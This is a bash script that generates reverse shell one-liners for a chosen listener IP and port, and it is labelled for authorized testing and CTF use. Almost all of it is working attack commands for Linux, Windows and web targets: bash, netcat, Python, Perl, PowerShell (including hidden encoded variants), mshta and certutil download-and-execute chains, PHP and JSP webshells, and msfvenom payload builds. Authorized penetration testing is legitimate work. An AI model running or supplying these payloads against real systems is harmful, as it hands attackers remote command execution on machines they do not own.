#!/bin/bash
# rev_shell_gen.sh — Generate reverse shell one-liners for a given IP and port
#
# FOR AUTHORIZED TESTING AND CTF USE ONLY
#
# USAGE:
#   ./rev_shell_gen.sh -i 10.10.14.5 -p 4444
#   ./rev_shell_gen.sh -i 10.10.14.5 -p 4444 -t windows

LHOST=""
LPORT="4444"
TARGET="all"

RED='\033[0;31m'; YELLOW='\033[1;33m'; GREEN='\033[0;32m'; CYAN='\033[0;36m'; BOLD='\033[1m'; RESET='\033[0m'
info() { echo -e "${CYAN}[*] $*${RESET}"; }
sec()  { echo -e "\n${BOLD}${YELLOW}── $* ──${RESET}"; }
cmd()  { echo -e "${GREEN}$*${RESET}"; }
sep()  { echo -e "${BOLD}$(printf '─%.0s' {1..65})${RESET}"; }

usage() {
    echo -e "rev_shell_gen.sh — Reverse shell one-liner generator"
    echo -e ""
    echo -e "  -i <ip>      Your listener IP (required)"
    echo -e "  -p <port>    Your listener port (default: 4444)"
    echo -e "  -t <target>  Target type: linux | windows | web | all (default: all)"
    echo -e "  -h           Help"
    echo -e ""
    echo -e "Examples:"
    echo -e "  $0 -i 10.10.14.5 -p 4444"
    echo -e "  $0 -i 10.10.14.5 -p 9001 -t windows"
    echo -e "  $0 -i 10.10.14.5 -p 4444 -t linux"
    exit 0
}

while [[ $# -gt 0 ]]; do
    case "$1" in
        -i) LHOST="$2";  shift 2 ;;
        -p) LPORT="$2";  shift 2 ;;
        -t) TARGET="$2"; shift 2 ;;
        -h|--help) usage ;;
        *) shift ;;
    esac
done

[[ -z "$LHOST" ]] && { echo "[-] Listener IP required (-i)"; usage; }

# URL-encoded IP and port for web payloads
LHOST_ENC=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$LHOST'))" 2>/dev/null || echo "$LHOST")

sep
echo -e "${BOLD}  REVERSE SHELL GENERATOR${RESET}"
sep
info "LHOST : $LHOST"
info "LPORT : $LPORT"
info "Target: $TARGET"
sep
echo ""
echo -e "${BOLD}Start your listener:${RESET}"
cmd "  nc -lvnp $LPORT"
cmd "  rlwrap nc -lvnp $LPORT        # better shell with readline"
cmd "  python3 -c \"import pty; pty.spawn('/bin/bash')\"  # upgrade shell after catching"
echo ""

# ── Linux / Unix ──────────────────────────────────────────────────────────────
if [[ "$TARGET" == "linux" || "$TARGET" == "all" ]]; then

    sec "BASH"
    cmd "  bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1"
    cmd "  bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'"
    cmd "  0<&196;exec 196<>/dev/tcp/$LHOST/$LPORT; sh <&196 >&196 2>&196"

    sec "SH"
    cmd "  sh -i >& /dev/tcp/$LHOST/$LPORT 0>&1"
    cmd "  /bin/sh -i > /dev/tcp/$LHOST/$LPORT 2>&1 0>&1"

    sec "NETCAT (traditional)"
    cmd "  nc -e /bin/bash $LHOST $LPORT"
    cmd "  nc -e /bin/sh $LHOST $LPORT"

    sec "NETCAT (no -e flag / OpenBSD nc)"
    cmd "  rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc $LHOST $LPORT > /tmp/f"
    cmd "  rm -f /tmp/f; mknod /tmp/f p && nc $LHOST $LPORT 0</tmp/f | /bin/bash 1>/tmp/f 2>/tmp/f"

    sec "PYTHON 3"
    cmd "  python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"$LHOST\",$LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
    cmd "  python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"$LHOST\",$LPORT));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn(\"/bin/bash\")'"

    sec "PYTHON 2"
    cmd "  python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$LHOST\",$LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"])'"

    sec "PERL"
    cmd "  perl -e 'use Socket;\$i=\"$LHOST\";\$p=$LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in(\$p,inet_aton(\$i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'"

    sec "RUBY"
    cmd "  ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"$LHOST\",\"$LPORT\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"

    sec "AWK"
    cmd "  awk 'BEGIN{s=\"/inet/tcp/0/$LHOST/$LPORT\";while(42){do{printf \"» \" |& s;s |& getline c;if(c){while((c |& getline)>0)print \$0 |& s;close(c)}}while(c!=\"exit\")close(s)}}' /dev/stdin"

    sec "LUA"
    cmd "  lua -e \"require('socket');require('os');t=socket.tcp();t:connect('$LHOST','$LPORT');os.execute('/bin/sh -i <&3 >&3 2>&3');\""

    sec "SOCAT"
    cmd "  socat tcp-connect:$LHOST:$LPORT exec:/bin/bash,pty,stderr,setsid,sigint,sane"
    cmd "  # Fully interactive (requires socat on attack box too):"
    cmd "  # Attacker: socat file:\`tty\`,raw,echo=0 tcp-listen:$LPORT"
    cmd "  # Target:   socat tcp-connect:$LHOST:$LPORT exec:/bin/bash,pty,stderr,setsid,sigint,sane"

    sec "SHELL UPGRADE (after catching basic shell)"
    cmd "  python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"
    cmd "  # Then: Ctrl+Z → stty raw -echo; fg → reset → export TERM=xterm"
fi

# ── Windows ───────────────────────────────────────────────────────────────────
if [[ "$TARGET" == "windows" || "$TARGET" == "all" ]]; then

    sec "POWERSHELL (encoded)"
    PS_CMD="\$client = New-Object System.Net.Sockets.TCPClient('$LHOST',$LPORT);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()"
    PS_ENC=$(echo -n "$PS_CMD" | iconv -t UTF-16LE 2>/dev/null | base64 -w 0 2>/dev/null || echo "<base64 encoding failed — run on Linux with iconv>")
    cmd "  powershell -nop -w hidden -enc $PS_ENC"

    sec "POWERSHELL (plain)"
    cmd "  powershell -nop -c \"\$client=New-Object Net.Sockets.TCPClient('$LHOST',$LPORT);\$st=\$client.GetStream();[byte[]]\$b=0..65535|%{0};while((\$i=\$st.Read(\$b,0,\$b.Length)) -ne 0){&([text.encoding]::UTF8).GetString(\$b,0,\$i)|iex}\""

    sec "POWERSHELL IEX DOWNLOAD CRADLE"
    cmd "  IEX(New-Object Net.WebClient).DownloadString('http://$LHOST:8000/shell.ps1')"

    sec "CMD / NETCAT (if nc.exe uploaded)"
    cmd "  nc.exe -e cmd.exe $LHOST $LPORT"
    cmd "  C:\\Windows\\Temp\\nc.exe -e cmd.exe $LHOST $LPORT"

    sec "MSHTA"
    cmd "  mshta vbscript:Execute(\"CreateObject(\"\"WScript.Shell\"\").Run \"\"powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://$LHOST:8000/shell.ps1')\"\"\"(window.close)\")"

    sec "CERTUTIL + EXECUTE"
    cmd "  certutil -urlcache -f http://$LHOST:8000/nc.exe C:\\Windows\\Temp\\nc.exe && C:\\Windows\\Temp\\nc.exe -e cmd $LHOST $LPORT"

    sec "PYTHON (Windows)"
    cmd "  python -c \"import socket,subprocess;s=socket.socket();s.connect(('$LHOST',$LPORT));subprocess.call(['cmd'],stdin=s,stdout=s,stderr=s)\""
fi

# ── Web / Script engines ──────────────────────────────────────────────────────
if [[ "$TARGET" == "web" || "$TARGET" == "all" ]]; then

    sec "PHP"
    cmd "  php -r '\$sock=fsockopen(\"$LHOST\",$LPORT);\$proc=proc_open(\"/bin/sh -i\",array(0=>\$sock,1=>\$sock,2=>\$sock),\$pipes);'"
    cmd "  # PHP webshell (upload via LFI/file upload):"
    cmd "  <?php system(\$_GET['cmd']); ?>"
    cmd "  <?php passthru(\$_GET['cmd']); ?>"
    cmd "  <?php \$sock=fsockopen(\"$LHOST\",$LPORT);\$proc=proc_open(\"/bin/sh -i\",array(0=>\$sock,1=>\$sock,2=>\$sock),\$pipes); ?>"

    sec "JSP (Java)"
    cmd "  # Upload this as shell.jsp:"
    cat <<'JSPEOF'
  <%Runtime.getRuntime().exec(new String[]{"/bin/bash","-c","bash -i >& /dev/tcp/LHOST/LPORT 0>&1"});%>
JSPEOF
    echo "  # Replace LHOST/LPORT above with: $LHOST / $LPORT"

    sec "WAR FILE (via msfvenom)"
    cmd "  msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f war -o shell.war"
    cmd "  # Deploy to Tomcat manager, then: curl http://target:8080/shell/"

    sec "ASPX (.NET)"
    cmd "  msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f aspx -o shell.aspx"

    sec "NODE.JS"
    cmd "  node -e \"require('child_process').exec('bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1')\""
    cmd "  (function(){var net=require('net'),cp=require('child_process'),sh=cp.spawn('/bin/sh',[]);var client=new net.Socket();client.connect($LPORT,'$LHOST',function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})()"
fi

sep
info "MSFvenom stageless shells (save and serve via upload_and_exec.sh):"
echo ""
cmd "  # Linux ELF"
cmd "  msfvenom -p linux/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf -o shell.elf"
cmd "  # Windows EXE"
cmd "  msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o shell.exe"
cmd "  # Windows DLL"
cmd "  msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f dll -o shell.dll"
echo ""
